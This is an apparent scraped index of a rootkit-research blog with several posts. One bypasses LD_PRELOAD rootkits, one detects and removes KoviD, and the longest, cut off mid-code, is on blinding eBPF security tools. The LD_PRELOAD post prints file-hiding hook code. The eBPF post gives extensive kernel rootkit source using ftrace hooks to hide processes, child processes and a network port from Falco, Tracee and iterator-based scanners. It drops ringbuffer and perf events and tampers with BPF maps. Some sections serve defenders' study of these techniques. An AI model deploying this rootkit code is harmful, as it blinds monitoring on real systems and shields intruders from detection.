essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if 